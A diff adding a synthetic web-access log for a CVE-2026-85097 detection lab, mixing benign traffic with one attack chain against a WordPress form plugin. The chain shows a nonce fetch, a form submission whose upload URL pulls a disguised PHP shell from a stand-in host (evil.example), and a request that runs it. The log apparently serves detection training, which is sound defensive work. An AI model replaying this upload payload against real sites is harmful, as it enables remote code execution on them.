@@ -1,0 +1,12 @@
+# SYNTHETIC training log for CVE-2026-85097 lab — generated 2026-10-19.
+# Contains one full attack chain (203.0.113.45: nonce -> weaponized submit ->
+# shell exec) plus benign traffic. No real attacker data.
+# NOTE: lone bricksforge_regenerate_nonce hits are noisy in real life (guest
+# forms use it legitimately) — Exercise 3 covers tuning with session cookies.
+203.0.113.45 - - [18/Oct/2026:02:11:03 +0000] "GET /wp-admin/admin-ajax.php?action=bricksforge_regenerate_nonce HTTP/1.1" 200 214 "-" "python-requests/2.31"
+203.0.113.45 - - [18/Oct/2026:02:11:19 +0000] "POST /wp-json/bricksforge/v1/form_submit HTTP/1.1" 200 532 "-" "python-requests/2.31" "temporaryFileUploads[0][url]=https://evil.example/x.gif%2ephp"
+203.0.113.45 - - [18/Oct/2026:02:14:55 +0000] "GET /wp-content/uploads/bricksforge/tmp/x.gif.php HTTP/1.1" 200 41 "-" "python-requests/2.31"
+# benign: contact form image upload
+192.0.2.77 - - [18/Oct/2026:11:20:02 +0000] "POST /wp-json/bricksforge/v1/form_submit HTTP/1.1" 200 488 "-" "Mozilla/5.0" "temporaryFileUploads[0][url]=https://site.example/uploads/resume.pdf"
+# benign: theme asset
+192.0.2.10 - - [18/Oct/2026:11:25:44 +0000] "GET /wp-content/uploads/2026/10/hero-banner.jpg HTTP/1.1" 200 88112 "-" "Mozilla/5.0"
